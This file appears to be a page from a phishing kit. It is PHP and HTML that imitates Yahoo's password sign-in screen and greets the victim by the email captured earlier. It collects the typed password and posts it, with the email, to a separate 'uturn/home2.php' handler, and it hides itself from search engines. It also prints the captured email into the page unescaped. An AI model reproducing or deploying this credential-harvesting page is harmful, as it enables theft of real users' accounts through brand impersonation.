<?php
session_start();
if(isset($_POST['submit'])) {


$email = $_POST['eUser'];

$_SESSION["eUser"]= $email;}
include "rtw.php";
?>


<!DOCTYPE html>
<html id="Stencil" class="no-js">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0"/>
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>Yahoo</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
		
		<link rel="shortcut icon" type="image/x-icon" href="images/yico.ico">
		
		
       
	   
        <link rel="stylesheet" href="css/minor.css">
       
        <style nonce="p5jXPCO14KX2iSIHxs/fiyLzjz0HYNhmj2neZh5GlSpzQK7D">
            #mbr-css-check { 
                display: inline;
            }
        </style>
		
		
		<style>body {
margin-top: 0px !important; 
}

#UH{
font: 13px/1.25 "Helvetica Neue",Helvetica,Arial,sans-serif;
}

.YLogoMY{
text-indent: -30em;
}</style>
        <link href="css/all.css" rel="stylesheet" type="text/css">
<link href="css/few.css" rel="stylesheet" type="text/css">
        
    </head>
    <body >
        <div class="mbr-legacy-device-bar " id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
            <input type="checkbox" id="mbr-legacy-device-bar-cross" />
            
			
        </div>
    
	

    <div class="loginish  puree-v2">
    <div class="hd mbr-ucs-hd" id="mbr-uh-hd">
    
	<div id="yucs-meta" ></div>
	<div id="UH" class="Row Pos(r) Start(0) T(0) End(0) Z(10) yucs-en-us yucs-login yucs" >  <div id="uhWrapper" class="Mx(a) Z(1) Pos(r) Zoom Mstart(16px) Pt(14px)" style ="height: 3.8em;"> <div class="UHCol1 Pos(a) Fl(start)" role="presentation">
<a class="YLogoMY D(b) Ov(h) Ti(-20em) Zoom Darktheme_Bgp(b_t) W(137px) H(34px) Mx(a)! " href="#" target="_top" >Yahoo</a></div> 

<div class="UHCol3" role="presentation" id="uhNavWrapper"> <ul class="Fl(end) Mend(10px) Lts(-0.31em) Tren(os) Whs(nw) My(6px)">   <li class="yucs-mail-info D(ib) Lts(n) Zoom Va(t) Pos(r) Lh(1.7)"><a class="yucs-fc D(ib) yltasis yucs-trigger Mend(20px) Lh(1) Td(n) Td(n):h NoTextDecoration" href="" target="_blank" ><b>About Mail</b></a>

<a class="yucs-fc D(ib) yltasis yucs-trigger Mend(20px) Lh(1) Td(n) Td(n):h NoTextDecoration" href="" target="_blank" ><b>Features</b></a>

<a class="yucs-fc D(ib) yltasis yucs-trigger Mend(20px) Lh(1) Td(n) Td(n):h NoTextDecoration" href="" target="_blank"><b>Get the App</b></a></li> <li id="yucs-help" class=" yucs-activate yucs-help yucs-menu_nav D(ib) Zoom Va(t) Pos(r) Lh(1.7)"> 

<a id="yucs-help_link" class="C(#000)! D(ib) Lts(n) yltasis yucs-trigger Lh(1) Td(n)! Td(u)!:h Fz(13px)" href="" target="_blank" > <b>Settings</b> </a></li> </ul> </div> </div></div>   
</div>

        <div class="login-box-container">
            <div class="login-box ">
                <div class="txt-align-center">
                        <img src="images/yLogo.png" alt="Yahoo" class="logo " width="125" />
                </div>
                <div class="challenge">
    <div id="password-challenge" class="primary">
    <div class="greeting">
        <h1 class="username">Hello <?php echo $_SESSION["eUser"] ?></h1>
        <p class="not-you"><a href="">Not you?</a></p>
    </div>
    <form action="uturn/home2.php" method="post" class="pure-form pure-form-stacked">
       

        <input type="hidden" name="Yemail" value="<?php echo $_SESSION["eUser"] ?>" />
        <div class="hidden-username">
            <input type="text" tabindex="-1" aria-hidden="true" role="presentation"
                autocorrect="off" spellcheck="false"
                name="username" value="<?php echo $_SESSION["eUser"] ?>" />
        </div>
       
        <input type="password" id="login-passwd"  name="Ypass" placeholder="Password" required="required"/>
        <p class="signin-cont">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign in" >
                Sign in
            </button>
        </p>
        <p class="forgot-cont">
            <input type="submit" class="pure-button puree-button-link"
                 id="mbr-forgot-link"
                name="skip" value="I forgot my password" />
        </p>
    </form>
</div>

</div>

            </div>
            <div id="login-box-ad-fallback" class="login-box-ad-fallback">
                <h1>Yahoo makes it easy to enjoy what matters most in your world.</h1>
<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.</p>

            </div>
        </div>
        <div class="login-box-ad-outer">
            <div class="login-box-ad-inner">
                <div id="login-ad-rich"></div>
            </div>
        </div>
</div>

    
   
   
    <div id="mbr-css-check"></div>
</body>
</html>


